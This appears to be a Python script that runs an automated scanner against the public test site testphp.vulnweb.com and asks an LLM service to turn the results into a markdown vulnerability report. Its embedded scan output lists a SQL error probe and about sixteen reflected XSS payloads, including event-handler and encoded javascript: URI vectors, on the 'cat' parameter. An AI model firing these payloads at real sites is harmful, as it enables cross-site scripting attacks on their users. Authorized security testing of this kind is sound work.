from exploitation import exploitation
import  api as groq


endpoints = ["http://testphp.vulnweb.com/listproducts.php?cat=123"]

# Example flags
flags = {
      # delay of 5 seconds
    "-t": "10" ,
     "--crawl":"-l 1" # use 10 threads
    ,
    "--file-log-level": "INFO"
}
exp=exploitation(end_points=endpoints)
b={'http://testphp.vulnweb.com/listproducts.php?cat=123': {'starttime': '2024-06-26 11:21:39 +0300', 'endtime': '2024-06-26 11:23:13 +0300', 'issue_count': 24, 'issue_list': [{'id': 0, 'type': 'INFO', 'issue': 'REFLECTED', 'method': 'GET', 'param': 'cat', 'payload': 'rEfe6', 'description': 'reflected parameter'}, {'id': 1, 'type': 'INFO', 'issue': 'STATIC ANALYSIS', 'method': 'GET', 'param': '-', 'payload': '<original query>', 'description': 'Found Server: nginx/1.19.0'}, {'id': 2, 'type': 'INFO', 'issue': 'STATIC ANALYSIS', 'method': 'GET', 'param': '-', 'payload': '<original query>', 'description': 'Not set HSTS'}, {'id': 3, 'type': 'INFO', 'issue': 'STATIC ANALYSIS', 'method': 'GET', 'param': '-', 'payload': '<original query>', 'description': 'Content-Type: text/html; charset=UTF-8'}, {'id': 4, 'type': 'LOW', 'issue': 'STATIC ANALYSIS', 'method': 'GET', 'param': '-', 'payload': '<original query>', 'description': 'Not Set X-Frame-Options'}, {'id': 5, 'type': 'MEDIUM', 'issue': 'STATIC ANALYSIS', 'method': 'GET', 'param': '-', 'payload': '<original query>', 'description': 'Not Set CSP'}, {'id': 6, 'type': 'INFO', 'issue': 'DYNAMIC ANALYSIS', 'method': 'GET', 'param': 'cat', 'payload': 'XsPeaR"', 'description': 'Found SQL Error Pattern'}, {'id': 7, 'type': 'INFO', 'issue': 'FILERD RULE', 'method': 'GET', 'param': 'cat', 'payload': 'onhwul=64', 'description': 'reflected EH on{any} pattern'}, {'id': 8, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<script>alert(45)</script>', 'description': 'reflected XSS Code'}, {'id': 9, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<meter onmouseover=alert(45)>0</meter>', 'description': 'reflected HTML5 XSS Code'}, {'id': 10, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<marquee onstart=alert(45)>', 'description': 'reflected HTML5 XSS Code'}, {'id': 11, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '"><iframe/src=JavaScriPt:alert(45)>', 'description': 'reflected XSS Code'}, {'id': 12, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<details/open/ontoggle="alert`45`">', 'description': 'reflected HTML5 XSS Code'}, {'id': 13, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<audio src onloadstart=alert(45)>', 'description': 'reflected HTML5 XSS Code'}, {'id': 14, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<video/poster/onerror=alert(45)>', 'description': 'reflected HTML5 XSS Code'}, {'id': 15, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<textarea autofocus onfocus=alert(45)>', 'description': 'reflected onfocus XSS Code'}, {'id': 16, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<a href="javascript&#0000058alert(45)">XSS</a>', 'description': 'reflected XSS Code'}, {'id': 17, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<select autofocus onfocus=alert(45)>', 'description': 'reflected onfocus XSS Code'}, {'id': 18, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<a href="javascript&#x003a;alert(45)">XSS</a>', 'description': 'reflected XSS Code'}, {'id': 19, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<a href="javascript&#0058;alert(45)">XSS</a>', 'description': 'reflected XSS Code'}, {'id': 20, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<keygen autofocus onfocus=alert(45)>', 'description': 'reflected onfocus XSS Code'}, {'id': 21, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<a href="&#14; javascript:alert(45)">XSS</a>', 'description': 'reflected XSS Code'}, {'id': 22, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<a href="javascript&colon;alert(45)">XSS</a>', 'description': 'reflected XSS Code'}, {'id': 23, 'type': 'HIGH', 'issue': 'XSS', 'method': 'GET', 'param': 'cat', 'payload': '<input autofocus onfocus=alert(45)>', 'description': 'reflected onfocus XSS Code'}]}}



re=groq.reporting(f"report one: {b}","please, create an organized report includes the vulnerable end point, payloads and other important information with good markdown structure,if the vulnerbility level is similar to same parameter but the  difference is in payloads collect all payloads in one issue")
print(re)